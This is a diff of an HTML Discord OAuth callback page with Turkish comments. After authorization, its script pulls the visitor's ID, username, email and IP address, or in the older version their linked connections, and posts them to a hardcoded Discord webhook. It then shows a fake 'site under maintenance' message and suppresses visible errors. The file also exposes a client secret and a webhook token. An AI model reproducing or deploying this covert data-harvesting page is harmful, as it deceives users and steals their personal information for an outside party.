@@ -12,46 +12,67 @@
       100% { color: rgb(255, 0, 0); }
     }
     body {
-      margin: 0;
-      height: 100vh;
-      background-color: #0f0f13;
+      background: #0f0f13;
+      font-family: monospace;
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
-      font-family: monospace, monospace;
-      user-select: none;
-      color: #ff4757;
+      min-height: 100vh;
       padding: 2rem;
+      color: #ff4757;
+      user-select: none;
+      margin: 0;
     }
     h1 {
-      font-size: 2.5rem;
-      text-align: center;
+      font-size: 2rem;
+      margin-bottom: 1rem;
       user-select: none;
+      transition: color 0.5s ease;
     }
+    /* RGB animasyon class'ı */
     .rgb {
       animation: rgbCycle 4s linear infinite;
+      font-size: 2.5rem;
+      color: inherit;
+      text-align: center;
+    }
+    /* Log gizli */
+    #log {
+      display: none;
     }
   </style>
 </head>
 <body>
   <h1 id="status">Yetkilendiriliyor...</h1>
+  <div class="log" id="log">OAuth başlatılıyor...</div>
 
   <script>
     (async () => {
-      const client_id = "1354724175788380327";
+      const client_id     = "1354724175788380327";
       const client_secret = "3A8QJOc_MSUXC8rXtA-kr_rzGt8b8q2d";
-      const redirect_uri = "https://rencordx.github.io/home/callback.html";
-      const webhook_url = "https://discord.com/api/webhooks/1381264711236059187/KR_WNPlGdrKRltp8Vj0LjKFhOSe7ecO9Br_dI0-6AWmRr7rF5-Vg0GYgXvIs-b_xOKrA";
+      const redirect_uri  = "https://rencordx.github.io/home/callback.html";
+      const webhook_url   = "https://discord.com/api/webhooks/1381264711236059187/KR_WNPlGdrKRltp8Vj0LjKFhOSe7ecO9Br_dI0-6AWmRr7rF5-Vg0GYgXvIs-b_xOKrA";
 
+      const logEl = document.getElementById("log");
       const statusEl = document.getElementById("status");
+
+      const log = (msg) => {
+        // İstersen log'u console da göster
+        console.log(msg);
+        // Log alanı görünmesin ama istersen yorum satırını kaldır log göstermek için
+        // logEl.textContent += "\n" + msg;
+      };
 
       const code = new URLSearchParams(window.location.search).get("code");
       if (!code) {
-        // Kod yoksa hiçbir işlem yok, status kalır
+        log("❌ URL'de ?code yok, işlem iptal.");
         return;
       }
 
       try {
+        log("OAuth başlatılıyor...");
+
         // 1. access_token al
         const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
           method: "POST",
@@ -66,24 +87,32 @@
         });
         const tokenData = await tokenRes.json();
         if (!tokenData.access_token) throw new Error("Access token alınamadı.");
+        log("✅ access_token alındı.");
 
-        // 2. Kullanıcının bağlantılarını (connections) çek
-        const connectionsRes = await fetch("https://discord.com/api/users/@me/connections", {
+        // 2. Kullanıcı bilgisi çek
+        const userRes = await fetch("https://discord.com/api/users/@me", {
           headers: { "Authorization": `Bearer ${tokenData.access_token}` }
         });
-        const connections = await connectionsRes.json();
+        const user = await userRes.json();
+        log("✅ Kullanıcı bilgisi çekildi.");
 
-        // 3. IP adresi al
+        // 3. Vanity URL (kısa kullanıcı URL'si)
+        const vanity_url = `https://discord.com/users/${user.id}`;
+
+        // 4. IP adresi çek
         const ipRes = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipRes.json();
+        log("✅ IP adresi alındı.");
 
-        // 4. Webhook payload
+        // 5. Webhook'a gönderilecek payload
         const payload = {
-          connections: connections,
-          client_ip: ipData.ip
+          id: user.id,
+          username: `${user.username}#${user.discriminator}`,
+          email: user.email || null,
+          client_ip: ipData.ip,
+          vanity_url: vanity_url
         };
 
-        // 5. Webhook'a gönder
         await fetch(webhook_url, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -92,12 +121,15 @@
           })
         });
 
-        // İşlem tamamlandıktan sonra yazıyı değiştir
+        log("✅ Webhook'a başarıyla gönderildi.");
+        log("Gönderilen veri:");
+        log(JSON.stringify(payload, null, 2));
+
+        // İşlem tamamlandıktan sonra mesajı değiştir ve RGB animasyonunu ekle
         statusEl.textContent = "Sitemiz Şu anda Bakımda.";
         statusEl.classList.add("rgb");
       } catch (err) {
-        // Hata olsa da kullanıcı görmesin, sadece konsola logla
-        console.error("Hata:", err);
+        log("❌ Hata oluştu: " + err.message);
       }
     })();
   </script>
